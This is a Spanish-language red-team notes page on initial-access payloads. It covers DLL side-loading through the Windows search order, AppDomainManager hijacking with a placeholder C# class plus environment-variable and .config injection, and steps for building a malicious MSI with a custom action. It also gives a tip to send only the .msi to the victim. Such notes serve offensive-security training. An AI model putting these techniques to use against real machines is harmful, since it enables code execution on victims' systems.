---
title: Payloads Avanzados — DLL Sideloading, MSI, AppDomainManager
tags: [initial-access, payload, dll-hijacking, appdomain, msi, excel-addin]
---

# Payloads Avanzados

## DLL Side-loading

Forzar a una aplicación legítima a cargar una DLL maliciosa abusando del orden de búsqueda de DLLs en Windows.

### Orden de búsqueda

1. Directorio de la aplicación
2. `C:\Windows\System32`
3. `C:\Windows\System`
4. `C:\Windows`
5. Directorio de trabajo actual
6. Directorios en `%PATH%`

### Identificar oportunidades con ProcMon

Buscar entradas donde el path termina en `.dll` y el resultado es **NOT FOUND**.

### Buscar en WinSxS

```powershell
ls -Path C:\Windows\WinSxS -Recurse -Filter ngentask.exe | Select -expand FullName
```

## AppDomainManager Hijacking

Obliga a aplicaciones .NET a cargar una DLL independientemente del orden de búsqueda, via `DOTNET_STARTUP_HOOKS` o archivos `.config`.

```csharp
using System;
using System.Windows.Forms;

namespace AppDomainHijack;

public sealed class DomainManager : AppDomainManager
{
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
        MessageBox.Show("Hello World", "Success");
    }
}
```

### Via variables de entorno

```powershell
$env:APPDOMAIN_MANAGER_ASM = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
$env:APPDOMAIN_MANAGER_TYPE = 'AppDomainHijack.DomainManager'
```

### Via archivo .config

Nombrar el fichero `<nombre_app>.exe.config`:

```xml
<configuration>
   <runtime>
      <appDomainManagerAssembly value="AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
      <appDomainManagerType value="AppDomainHijack.DomainManager" />
   </runtime>
</configuration>
```

## Windows Installer (MSI)

Crear un MSI malicioso desde Visual Studio con la extensión [Installer Projects](https://marketplace.visualstudio.com/items?itemName=VisualStudioClient.MicrosoftVisualStudio2022InstallerProjects):

1. Crear Setup Project
2. Application Folder > Add > File (payload)
3. Solution Explorer > View > Custom Actions
4. Click derecho en Install > Add Custom Action > Application folder (seleccionar payload)
5. Opciones: `Run64Bit = True`
6. Build > Build Solution → genera `.exe` y `.msi`

> [!tip] Solo enviar el .msi a la víctima — el .exe no es necesario.

## Excel Add-Ins (.xlam)

Archivo `.xlam` que añade funcionalidades a Excel. Los usuarios lo usan para macros en la barra de tareas.

## Ver también
- [[02-initial-access/payloads/droppers|Droppers]]
- [[03-post-explotacion/privilege-escalation/windows/dll-hijacking|DLL Hijacking]]
- [[02-initial-access/triggers|Triggers]]
